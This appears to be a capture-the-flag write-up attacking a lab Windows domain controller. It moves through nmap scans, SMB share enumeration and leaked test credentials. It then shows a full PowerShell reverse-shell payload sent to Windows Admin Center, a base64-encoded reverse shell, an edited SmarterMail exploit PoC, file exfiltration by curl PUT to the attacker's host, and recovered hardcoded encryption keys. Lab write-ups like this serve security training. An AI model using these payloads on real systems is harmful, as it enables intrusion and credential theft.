| w16mcdQKgFAQh9z2HxQ/QaP5Xc4edNpNqy2o5e5X7rOY4iHYj5csZpV+PetuPCxs
| I8hUaSjPEWmSAFrFejOR/LgUS0l/4LNE3ixwwnyOSg0BqHEQxv8of2VMG6zgf8a3
| mSDhBVmmhKCXgiOb5DyiE721w9LLxUcUygA+vw33p2SfdDRsbApSV+xFWp2OzN6i
| Jlk6ZCBR7oVo5nEjGIDmW17C689SIrFZpUW/OxuXX6I95s4maePjqN+Mp6mFW70C
| AwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqG
| SIb3DQEBCwUAA4IBAQCRt0ETKSz46BuctLcwG1I6YsmDHB6hD4efSjzUZF6/a1wG
| LewqqsV02wr7H/u6z2dQdIw8m01SqV/zu5tByMIFocBmxitLrlSqVq+d/9uzHfFT
| XK6E5kPDjDEI0X6a5W0IWY5XXqqhASGvBr0ERcMU16WNeCYk4KWnNmA10XYY6F98
| qYCXsgsILJfL5t8DwLQyx2v8sHGiFYsy2Y8/4KMgPqKCk2b8YY6ziWBHjZ0ystWA
| 1C2wWJnogbHugS1amE0l2OTuw3RwYWX6LBaOvSKyoMKWG/hcJBY0IORlevjC53/X
| Tl5DYgm8JDDoW04DbrY9VXGDxNmiNeymhE9jVj8M
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: DANGLINGTREE
|   NetBIOS_Domain_Name: DANGLINGTREE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: danglingtree.htb
|   DNS_Computer_Name: dc.danglingtree.htb
|   DNS_Tree_Name: danglingtree.htb
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-11T16:24:04+00:00
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.99%I=7%D=8/11%Time=6A7AEA0F%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\
SF:0\0\0");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 15522/tcp): CLEAN (Timeout)
|   Check 2 (port 30305/tcp): CLEAN (Timeout)
|   Check 3 (port 15854/udp): CLEAN (Timeout)
|   Check 4 (port 28688/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
| smb2-time: 
|   date: 2026-08-11T16:24:06
|_  start_date: N/A

```

- Don't really find much so I do a full port scan:
```
nmap -sV -sC -vv 10.129.72.173 -p-

---OUTPUT-EXTRA PORTS--
6600/tcp  open  ssl/mshvlm?   syn-ack ttl 127
| ssl-cert: Subject: commonName=dc.danglingtree.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.danglingtree.htb
| Issuer: commonName=danglingtree-DC-CA/domainComponent=danglingtree
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-26T05:41:20
| Not valid after:  2027-03-26T05:41:20
| MD5:     7f8b 9a97 773d e83d 981a f9cd 1cc7 f0ad
| SHA-1:   57db 0c74 fcba 80b5 4d4e 55d6 efec eb60 4506 6b05
| SHA-256: c808 12fe 9f1a b25a aac7 89ce 31ac 813f a01d dd06 a68a 0282 238a f1d5 81bd c797
| -----BEGIN CERTIFICATE-----
| MIIHSjCCBTKgAwIBAgITHgAAAANTkcVIb02hQgAAAAAAAzANBgkqhkiG9w0BAQsF
| ADBQMRMwEQYKCZImiZPyLGQBGRYDaHRiMRwwGgYKCZImiZPyLGQBGRYMZGFuZ2xp
| bmd0cmVlMRswGQYDVQQDExJkYW5nbGluZ3RyZWUtREMtQ0EwHhcNMjYwMzI2MDU0
| MTIwWhcNMjcwMzI2MDU0MTIwWjAeMRwwGgYDVQQDExNkYy5kYW5nbGluZ3RyZWUu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApiqCCMCQbZ+M44Jx
| 5HiS1EXpeRiLF9VG+t4gQBJ3UdM920w1gEFAVkxpUTfj65Rg/ec26S1HxrsJXWCV
| LB3rVMzNcpvTMiWF9mkDwtGeafhU+SCwHNLUbvYkoAiEClUN8TCYeO3Fr43/2vnh
| +7sIUGXdBQDWgpYSf+c3cUonN70phYbY2TIsn50F41qY7V+2KbUkaNvvVbX1xnun
| DN15hokgZMPlO81RvXmuwwvOncyIOLd0QLIzMvrE2/B6zfoP8/MMbCkP2OshxwgO
| KjZa/stMlQJ2OLWMpi3QTpnsvnZpKivDengJyJgFMwtfcrKka+ddh6AqaOHP3P+C
| 7K58CQIDAQABo4IDTTCCA0kwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQUziYGgiq/pshU0Sj3CI14I1mbG8UwHwYDVR0jBBgwFoAUguG/Bzw1Cx5J
| FNMx4ICaKT9NHvUwgdAGA1UdHwSByDCBxTCBwqCBv6CBvIaBuWxkYXA6Ly8vQ049
| ZGFuZ2xpbmd0cmVlLURDLUNBLENOPWRjLENOPUNEUCxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWRhbmds
| aW5ndHJlZSxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29i
| amVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHJBggrBgEFBQcBAQSBvDCB
| uTCBtgYIKwYBBQUHMAKGgalsZGFwOi8vL0NOPWRhbmdsaW5ndHJlZS1EQy1DQSxD
| Tj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049
| Q29uZmlndXJhdGlvbixEQz1kYW5nbGluZ3RyZWUsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MD8GA1Ud
| EQQ4MDagHwYJKwYBBAGCNxkBoBIEEDq+sABwNwVEvZzuNTouAOCCE2RjLmRhbmds
| aW5ndHJlZS5odGIwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEEAYI3GQIBoC4ELFMt
| MS01LTIxLTQyMjAyMzgzMzItNTcwMjM3MjgtMTEyOTExMDY0Ni0xMDAwMA0GCSqG
| SIb3DQEBCwUAA4ICAQCDrFs2CE5wk0ob6FYZOealIlCmVjq++jNtAh8I5t2/Ycg9
| Do4QSI8SB4zxbaN96M/d2czUUHQFWFe7v5t7ClYvqfvoo92Se/Xnm0Ax05P28JBb
| t6sC8tAWPF1poqLvStZQO/uci3C50kHgs7h/lolS90/xijQ/aJiTNiV76f5hnP+t
| U3vT2X4i1W7BvVxwTurORpPcmdfdAj4Zh9JEpB9Fb9OVAyvOh/ieHk5o7WhPsL2v
| p/yZmP1Meru/h8WXp8BGaJkOgJYwOOdsr8g/WP6gZ2iix2ZZYGVmFzHqPAmpCdOC
| oE3vTdhcBNL5oRC2rvb5ylatshnZKnIlgWmG2FqQzT7iPXTSh6CvGKLNHRO9CLnu
| Dwr6p3DU4reXxZK9Yv/N+Xf7pXvKk0Ylx1VnIeMLcv0qxFEZ+Aut3TKQDqDYtGwF
| 2CXEs7TshCeWbot+ugCjYXE5Y8VcjnLGTQC+MnbgkN0vTiFSK4PLu8s/yAwMVtIS
| qBCVH+y8IgtqbYPTPFbZur14TgNr2cc4veJHSwi1OqgXcYXd60Z38GinaB1oGdQ8
| D25ebTYV8XEJABAIvfA8iCPYgpbvAb7B/TfxR2s6nUkZhcxHrqGc0sNz3Rh1wBEJ
| iVphr24G/+M2zbQus0G5FZJeAxMpEbogs6PI9EUwa0w2qKqYGI2+tv5mNVrldA==
|_-----END CERTIFICATE-----
| tls-alpn: 
|   h2
|_  http/1.1
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 403 Forbidden
|     Connection: close
|     Date: Fri, 14 Aug 2026 15:10:26 GMT
|     Cache-Control: no-store
|     Cache-Control: max-age=0
|     Pragma: no-cache
|     Set-Cookie: .AspNetCore.Antiforgery.7Eyhia2WOxE=CfDJ8HsozULo80ZBsxvkNAKguoks9ZwZcZld9JkY-a6d6eJq168hExjFmWTekbqj3vh4SI6a_MQ_vVmWvH84QxMgembIsArChITa2a6uHw8_1-Br8hoQU-Td1o45hokA8jj8txnAuQ_NSIGuFvJfnHbYXAg; path=/; secure; samesite=none; Partitioned
|     Set-Cookie: WAC-SESSION=15913e6bcbb94f028fd258409d0b4db3; expires=Sat, 15 Aug 2026 15:10:26 GMT; path=/; secure; samesite=lax; httponly
|     Set-Cookie: WAC-TOKEN=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Set-Cookie: WAC-AAD=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Set-Cookie: XSRF-TOKEN=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Strict-Transport-Security: max-age=5184000; includeSubDomains; preload
|     <!DOCTYPE html>
|     <html lang="en" xmlns="http://www.w3.org/1999/xhtml">
|     <head
|   HTTPOptions: 
|     HTTP/1.1 403 Forbidden
|     Connection: close
|     Date: Fri, 14 Aug 2026 15:10:26 GMT
|     Cache-Control: no-store
|     Cache-Control: max-age=0
|     Pragma: no-cache
|     Set-Cookie: .AspNetCore.Antiforgery.7Eyhia2WOxE=CfDJ8HsozULo80ZBsxvkNAKguomxQhGnzLOhqbtAjPIDcbJ9_P3OBZ-I9wAF275xd3VsT7Pa8Hu2D0bAQACkZ1kSuwPiu7COZJuTHcFQbLmDnvSSQ0mrxfDQ9e5_88-U5swyKMDiwxcmGOODfGIr-8EH1EI; path=/; secure; samesite=none; Partitioned
|     Set-Cookie: WAC-SESSION=9ebf514d58b849d7947cff330fe6b03a; expires=Sat, 15 Aug 2026 15:10:26 GMT; path=/; secure; samesite=lax; httponly
|     Set-Cookie: WAC-TOKEN=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Set-Cookie: WAC-AAD=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Set-Cookie: XSRF-TOKEN=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Strict-Transport-Security: max-age=5184000; includeSubDomains; preload
|     <!DOCTYPE html>
|     <html lang="en" xmlns="http://www.w3.org/1999/xhtml">
|_    <head
|_ssl-date: TLS randomness does not represent time
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49681/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49682/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49703/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49722/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49769/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

- Port 6600 looks interesting

### Port 6600 Browser
- I access it via `https://danglingtree.htb:6600`
![[Pasted image 20260814041609.png]]

- We need some login credentials to get in.
### Enumerating SMB

```
# List SMB Shares
smbclient -L '\\10.129.72.173\' -N

# Connect to unusual share
smbclient '\\10.129.72.173\IT' -N
cd Security
get *

---OUTPUT-1---
Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        IT              Disk      
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.72.173 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

![[Pasted image 20260814042115.png]]

![[Pasted image 20260814042145.png]]

- I check the pdf I grab from the SMB share `IT` to find its a pentesting RoC document with initial credentials given: `anderson.w`:`R3dT3am@Acc3ss#01`
```
open DanglingTree_RoE_Assessment.pdf
```
![[Pasted image 20260814042506.png]]

- I use these credentials to log into the `Windows Admin Center` on the browser. I also keep BurpSuite active to analyze network traffic
![[Pasted image 20260814042744.png]]

- I manage to login. On browsing through I find an interesting post request when clicking on the highlighted section `:https://danglingtree.htb:6600/api/services/WinREST/PowerShell/nodes/dc/invokeCommand`

![[Pasted image 20260814043023.png]]

- Looking online I find a CVE : `CVE-2026-26119` 
- Using the following body as a POST request I send it through the repeater to grab a shell:
```
{"properties":{"script":"$client = New-Object System.Net.Sockets.TCPClient('10.10.16.19',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()","command":"Get-WACSMServerConnectionStatus","module":"Microsoft.SME.ServerManager","state":"ready","useInProcRunspace":false,"invokeMode":"Polling"}}
```
![[Pasted image 20260814043950.png]]

- Note it may be time sensitive so send it through the Repeater soon after clicking the highlighter region to generate the post request in BurpSuite

- I get a shell on my listener:
![[Pasted image 20260814044042.png]]

- However the shell isn't stable. I use the following command to get another more stable shell:
```
Invoke-Command -ScriptBlock { Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQA5ACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" }
```
![[Pasted image 20260814044447.png]]

- Checking the internal ports I see an extra one which is probably running internally:
```
netstat -ano

---RELEVANT-OUTPUT---
  TCP    [::]:17017             [::]:0                 LISTENING       2948
```
![[Pasted image 20260814044802.png]]

- I grab ligolo to create a tunnel to access it:
- First I set it up locally:
```
---LOCAL-MACHINE---
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 240.0.0.1/32 dev ligolo

./proxy -selfcert -laddr 0.0.0.0:9000
```

- Then  I send it to the target. Note I tried `wget` and `iwr -uri` but they don't fully download the file and it hangs. `curl.exe` however works well:
```
# Local server
python3 -m http.server 80

# Target curl

curl.exe http://10.10.16.19/agent.exe -o C:\ProgramData\agent.exe
```

- Then I set it up on the target and connect it to my machine:
```
.\agent.exe -connect 10.10.16.19:9000 -ignore-cert
```

- Finally I start the tunnel on my ligolo UI:
```
session
>1
>start
```
![[Pasted image 20260814045622.png]]

- I check it on the browser and find a login, but `anderson.w`'s credentials don't work here:
![[Pasted image 20260814050505.png]]
- I do a quick nmap scan:
```
nmap -sC -sV -vv 240.0.0.1 -p 17017

---OUTPUT---
Nmap scan report for 240.0.0.1
Host is up, received reset ttl 64 (0.0054s latency).
Scanned at 2026-08-14 04:55:44 EDT for 24s

PORT      STATE SERVICE REASON         VERSION
17017/tcp open  unknown syn-ack ttl 64
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|     Date: Fri, 14 Aug 2026 15:55:56 GMT
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 302 Found
|     Content-Length: 0
|     Connection: close
|     Date: Fri, 14 Aug 2026 15:55:55 GMT
|     Location: /interface/root
|     Content-Security-Policy: default-src 'self';frame-src 'self' *.youtube.com youtu.be *.smartertools.com docs.google.com;script-src * 'unsafe-inline';font-src * 'unsafe-inline' data:;img-src * 'unsafe-inline' data: blob:;style-src * 'unsafe-inline';media-src *;frame-ancestors 'self';connect-src *;
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     X-Content-Type-Options: nosniff
|     X-Robots-Tag: noindex
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Content-Length: 0
|     Connection: close
|_    Date: Fri, 14 Aug 2026 15:55:56 GMT
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port17017-TCP:V=7.99%I=7%D=8/14%Time=6A7ED81C%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,21C,"HTTP/1\.1\x20302\x20Found\r\nContent-Length:\x200\r\nCon
SF:nection:\x20close\r\nDate:\x20Fri,\x2014\x20Aug\x202026\x2015:55:55\x20
SF:GMT\r\nLocation:\x20/interface/root\r\nContent-Security-Policy:\x20defa
SF:ult-src\x20'self';frame-src\x20'self'\x20\*\.youtube\.com\x20youtu\.be\
SF:x20\*\.smartertools\.com\x20docs\.google\.com;script-src\x20\*\x20'unsa
SF:fe-inline';font-src\x20\*\x20'unsafe-inline'\x20data:;img-src\x20\*\x20
SF:'unsafe-inline'\x20data:\x20blob:;style-src\x20\*\x20'unsafe-inline';me
SF:dia-src\x20\*;frame-ancestors\x20'self';connect-src\x20\*;\r\nX-Frame-O
SF:ptions:\x20SAMEORIGIN\r\nX-XSS-Protection:\x201;\x20mode=block\r\nX-Con
SF:tent-Type-Options:\x20nosniff\r\nX-Robots-Tag:\x20noindex\r\n\r\n")%r(H
SF:TTPOptions,21C,"HTTP/1\.1\x20302\x20Found\r\nContent-Length:\x200\r\nCo
SF:nnection:\x20close\r\nDate:\x20Fri,\x2014\x20Aug\x202026\x2015:55:55\x2
SF:0GMT\r\nLocation:\x20/interface/root\r\nContent-Security-Policy:\x20def
SF:ault-src\x20'self';frame-src\x20'self'\x20\*\.youtube\.com\x20youtu\.be
SF:\x20\*\.smartertools\.com\x20docs\.google\.com;script-src\x20\*\x20'uns
SF:afe-inline';font-src\x20\*\x20'unsafe-inline'\x20data:;img-src\x20\*\x2
SF:0'unsafe-inline'\x20data:\x20blob:;style-src\x20\*\x20'unsafe-inline';m
SF:edia-src\x20\*;frame-ancestors\x20'self';connect-src\x20\*;\r\nX-Frame-
SF:Options:\x20SAMEORIGIN\r\nX-XSS-Protection:\x201;\x20mode=block\r\nX-Co
SF:ntent-Type-Options:\x20nosniff\r\nX-Robots-Tag:\x20noindex\r\n\r\n")%r(
SF:RTSPRequest,76,"HTTP/1\.1\x20505\x20HTTP\x20Version\x20Not\x20Supported
SF:\r\nContent-Length:\x200\r\nConnection:\x20close\r\nDate:\x20Fri,\x2014
SF:\x20Aug\x202026\x2015:55:56\x20GMT\r\n\r\n")%r(RPCCheck,67,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close
SF:\r\nDate:\x20Fri,\x2014\x20Aug\x202026\x2015:55:56\x20GMT\r\n\r\n")%r(D
SF:NSVersionBindReqTCP,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-L
SF:ength:\x200\r\nConnection:\x20close\r\nDate:\x20Fri,\x2014\x20Aug\x2020
SF:26\x2015:55:56\x20GMT\r\n\r\n")%r(DNSStatusRequestTCP,67,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r
SF:\nDate:\x20Fri,\x2014\x20Aug\x202026\x2015:55:56\x20GMT\r\n\r\n");

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:56
Completed NSE at 04:56, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:56
Completed NSE at 04:56, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:56
Completed NSE at 04:56, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.01 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (84B)
```

- I see smartertools which leads to SmarterMail app whens earching online
- Searching unauthenticated RCE on smartermail leads me to a cve : `CVE-2026-24423` which leads me to this PoC: https://github.com/aavamin/CVE-2026-24423
- I download the exploit, edit it to run my payload :
```
# Part of code I changed:

"CommandMount": "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQA5ACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
            }
```

- I then ran it while sending the following request through BurpSuite:
```
POST /api/v1/settings/sysadmin/connect-to-hub HTTP/1.1
Host: 240.0.0.1:17017
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
Content-Length: 97

{
  "hubAddress": "http://10.10.16.19",
  "oneTimePassword": "test",
  "nodeName": "victim"
}
```
![[Pasted image 20260814050347.png]]

- I get a hit on my exploti server:
![[Pasted image 20260814050330.png]]

- This then triggers the payload and I grab a shell on my lsitener as `svc_mail`:
![[Pasted image 20260814050429.png]]

- Looking at the path we can see its an application. 
- I find an encrypted password in `C:\SmarterMail\Domains\danglingtree.htb.bak\Users\noah.b`
```
cat settings.json

---RELEVANT-OUTPUT---
<SNIP>
"password_encrypted":"66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby",
<SNIP>
```
![[Pasted image 20260814053000.png]]
- To find how it is decrypted we need to analyze how the app works, how it encrypts and decrypts the messages:
- I find some interesting dll's to analyze : `MailService.dll` and `SmarterMail.Standard.dll` in the path `C:\Program Files (x86)\SmarterTools\SmarterMail\Service`
- Initially I try to send it many ways but kept running into issues and it didn't download the dll fully. Using curl would download the file but due to the headers that wen't along with it, it didn't download properly.
	- So i created a python script to capture the file, remove the headers and check the file size to make sure I downloaded it fully
```
cat recv.py    
from http.server import BaseHTTPRequestHandler, HTTPServer
import os

class H(BaseHTTPRequestHandler):
    def do_PUT(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        filename = os.path.basename(self.path)
        if not filename:
            filename = 'upload'
        open(filename, 'wb').write(data)
        self.send_response(200)
        self.end_headers()
        print(f"Saved {len(data)} bytes to {filename}")

HTTPServer(('0.0.0.0', 8000), H).serve_forever()

---OUTPUT---
10.129.72.173 - - [14/Aug/2026 05:44:11] "PUT /MailService.dll HTTP/1.1" 200 -
Saved 26011648 bytes to MailService.dll
10.129.72.173 - - [14/Aug/2026 05:44:28] "PUT /SmarterMail.Standard.dll HTTP/1.1" 200 -
Saved 36341248 bytes to SmarterMail.Standard.dll
```
![[Pasted image 20260814054656.png]]

- I then send it to my machine with the curl command:
```
curl.exe -X PUT -T "C:\Program Files (x86)\SmarterTools\SmarterMail\Service\SmarterMail.Standard.dll" http://10.10.16.19:8000/

curl.exe -X PUT -T "C:\Program Files (x86)\SmarterTools\SmarterMail\Service\MailServer." http://10.10.16.19:8000/
```

- Once I get the files, I move it to my local machine to analyze it with DNSPeek.
	- i Open MailService.dll
- I search for the keywork "Crypt" which leads me to find a CryptographyHelper(0) function:
![[Pasted image 20260814055404.png]]

- I right click on the function (on the right) and click "Go to Declaration"
- This leads to keymap1 and keymap2 values after loading SmarterMail.Standard.dll .pdb:
```
public class CryptographyHelper
{
  private readonly (byte[] key, byte[] iv) keymap1 = (new byte[8]
  {
    (byte) 125,
    (byte) 113,
    (byte) 232,
    (byte) 233,
    (byte) 160 /*0xA0*/,
    (byte) 34,
    (byte) 123,
    (byte) 208 /*0xD0*/
  }, new byte[8]
  {
    (byte) 224 /*0xE0*/,
    (byte) 222,
    (byte) 8,
    (byte) 14,
    (byte) 29,
    (byte) 138,
    (byte) 139,
    (byte) 223
  });
  private readonly (byte[] key, byte[] iv) keymap2 = (new byte[8]
  {
    (byte) 180,
    (byte) 63 /*0x3F*/,
    (byte) 132,
    (byte) 209,
    (byte) 16 /*0x10*/,
    (byte) 180,
    (byte) 233,
    (byte) 145
  }, new byte[8]
  {
    (byte) 1,
    (byte) 216,
    (byte) 174,
    (byte) 230,
    (byte) 73,
    (byte) 173,
    (byte) 146,
    (byte) 39
  });
```

